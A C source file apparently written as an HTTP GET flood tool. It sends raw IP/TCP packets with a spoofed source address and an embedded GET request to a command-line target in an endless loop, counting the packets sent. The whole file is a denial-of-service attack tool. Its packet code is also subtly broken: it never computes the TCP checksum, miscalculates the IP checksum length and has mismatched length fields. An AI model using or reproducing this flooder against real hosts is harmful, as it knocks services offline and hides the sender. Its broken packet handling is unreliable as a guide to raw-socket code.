// http_get_flood.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

struct packet {
    struct iphdr ip;
    struct tcphdr tcp;
    char http_payload[512];
};

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target_ip> <target_host>\n", argv[0]);
        printf("Example: %s 1.2.3.4 example.com\n", argv[0]);
        return 1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct packet pkt;
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(argv[1]);

    char http_request[512];
    snprintf(http_request, sizeof(http_request),
             "GET /?%d HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0\r\n"
             "Connection: close\r\n\r\n",
             rand(), argv[2]);

    printf("HTTP GET Flooding %s (%s)...\n", argv[2], argv[1]);

    unsigned long count = 0;
    while (1) {
        memset(&pkt, 0, sizeof(pkt));

        // IP Header
        pkt.ip.version = 4;
        pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(http_request));
        pkt.ip.id = htons(rand());
        pkt.ip.ttl = 64;
        pkt.ip.protocol = IPPROTO_TCP;
        pkt.ip.saddr = inet_addr("1.2.3.4"); // Spoof
        pkt.ip.daddr = inet_addr(argv[1]);
        pkt.ip.check = 0;
        pkt.ip.check = checksum((unsigned short*)&pkt.ip, sizeof(struct iphdr)/2);

        // TCP Header
        pkt.tcp.source = htons(rand() % 65535);
        pkt.tcp.dest = htons(80);
        pkt.tcp.seq = htonl(rand());
        pkt.tcp.ack_seq = 0;
        pkt.tcp.doff = 5;
        pkt.tcp.psh = 1;
        pkt.tcp.ack = 1;
        pkt.tcp.window = htons(65535);

        // HTTP Payload
        snprintf(pkt.http_payload, sizeof(pkt.http_payload),
                 "GET /?%d HTTP/1.1\r\nHost: %s\r\n\r\n", rand(), argv[2]);

        sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&dest, sizeof(dest));
        
        count++;
        if (count % 50000 == 0) {
            printf("\r[+] HTTP requests: %lu", count);
            fflush(stdout);
        }
    }

    return 0;
}
